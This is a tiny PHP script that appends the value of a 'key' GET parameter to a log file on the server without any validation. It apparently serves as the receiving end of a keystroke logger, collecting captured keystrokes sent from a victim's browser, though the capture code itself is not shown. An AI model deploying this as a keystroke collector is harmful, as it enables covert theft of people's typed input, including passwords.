<html>
<?php
if(ISSET($_GET['key'])){$operator = fopen("folder/log.txt","a"); fwrite($operator,$_GET['key']);fclose($operator);}
?>
</html>